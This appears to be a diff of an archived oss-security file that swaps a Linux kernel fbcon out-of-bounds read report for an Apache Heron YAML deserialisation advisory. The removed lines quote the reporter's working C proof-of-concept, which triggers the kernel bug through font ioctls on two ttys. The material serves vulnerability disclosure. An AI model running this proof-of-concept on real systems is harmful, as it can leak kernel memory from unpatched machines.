@@ -1,83 +1,41 @@
 X-Archive-Source: openwall-scrape
-X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/11/25/1
-Message-ID: <0decfd9b-69ed-8acc-2a1d-9bffa5429589@csail.mit.edu>
-Date: Tue, 24 Nov 2020 22:23:24 -0800
-From: "Srivatsa S. Bhat" <srivatsa@...il.mit.edu>
-To: oss-security@...ts.openwall.com, Minh Yuan <yuanmingbuaa@...il.com>
-Subject: Re: Linux kernel slab-out-of-bounds Read in fbcon
+X-Archive-Source-URL: https://www.openwall.com/lists/oss-security/2020/04/16/1
+Message-ID: <CAFkuAo1KHC_=9a5CepfMVooTOzfqFg0MODus-PR5QzyzBxOp=g@mail.gmail.com>
+Date: Wed, 15 Apr 2020 22:59:22 -0500
+From: Josh Fischer <josh@...hfischer.io>
+To: oss-security@...ts.openwall.com
+Subject: CVE-2020-1964: Apache Heron (incubating) information disclosure vulnerability
 Content-Type: text/plain; charset=utf-8
 
-On 11/9/20 6:41 AM, Minh Yuan wrote:
-> Hi,
-> 
-> We recently discovered a slab-out-of-bounds read in fbcon in the latest
-> kernel ( v5.10-rc2 for now).
-> 
-> The root cause of this vulnerability is that "fbcon_copy_font" did not
-> handle "vc->vc_font.data" and "vc->vc_font.height" consistently. However,
-> the patch <https://lkml.org/lkml/2020/9/27/223> for VT_RESIZEX and the patch
-> <https://lkml.org/lkml/2020/9/24/720> for fbcon_get_font() can't handle
-> this issue.
-> 
-> This is my PoC (it needs the privilege to access tty to trigger this bug):
-> 
-> // author by ziiiro@THU
-> #include <stdio.h>
-> #include <stdlib.h>
-> #include <unistd.h>
-> #include <sys/types.h>
-> #include <sys/stat.h>
-> #include <sys/ioctl.h>
-> #include <fcntl.h>
-> #include <linux/fb.h>
-> #include <linux/vt.h>
-> #include <linux/kd.h>
-> #include <string.h>
-> 
-> int main(int argc, char** argv)
-> {
->     struct console_font_op op;
->     struct consolefontdesc cfdarg;
->     void *addr = malloc(0x100);
->     memset(addr,'a',0x100);
->     int fd1 = open("/dev/tty1", O_RDWR, 0);
->     int fd2 = open("/dev/tty6", O_RDWR, 0);
->     op.op = KD_FONT_OP_SET;
->     op.width = 8;
->     op.height = 1;
->     op.data = addr;
->     op.charcount = 0x100;
->     // alloc a samll font.data
->     ioctl(fd2,KDFONTOP,&op);
->     op.height = 0x20;
->     // set a large font.height
->     ioctl(fd1, KDFONTOP, &op);
->     op.op = KD_FONT_OP_COPY;
->     // access tty6's font
->     op.height = 5;
->     // use a larger height (tty1) to access the small font.data (tty6)
->     ioctl(fd1,KDFONTOP,&op);
-> }
-> 
-> The patch for this bug is available: commit
-> 3c4e0dff2095c579b142d5a0693257f1c58b4804 (
-> https://git.kernel.org/pub/scm/linux/kernel/git/torvalds/linux.git/commit/?id=3c4e0dff2095c579b142d5a0693257f1c58b4804
-> )
-> 
-> Timeline:
-> * 6/11/20 - Vulnerability reported to security@...nel.org and
-> linux-distros@...openwall.org.
-> * 9/11/20 - Vulnerability patched.
-> * 9/11/20 - Vulnerability public.
-> 
-> Regards,
-> 
-> Yuan Ming from Tsinghua University
-> 
+CVE-2020-1964: Apache Heron (incubating) information disclosure
+vulnerability
 
-It looks like CVE-2020-28974 has been assigned for this issue.
-https://nvd.nist.gov/vuln/detail/CVE-2020-28974
+Severity: Important
+
+Vendor:
+The Apache Software Foundation
+
+Versions Affected:
+0.20.2-incubating
+0.20.1-incubating
+v-0.20.0-incubating
+
+Description:
+In versions 0.20.2-incubating and before in Apache Heron does not
+configure its YAML parser to prevent the instantiation of arbitrary
+types, resulting in remote code execution vulnerabilities (CWE-502:
+Deserialization of Untrusted Data).
+
+Mitigation:
+0.20.2-incubating and previous users should build from the current HEAD of
+master.
+A vote has been started for a new release 0.20.3-incubating which will
+include the fix.
+
+Credit:
+This vulnerability was discovered by Frederic Vleminckx
 
 Regards,
-Srivatsa
-VMware Photon OS
+
+The Apache Heron (Incubating) Team
+
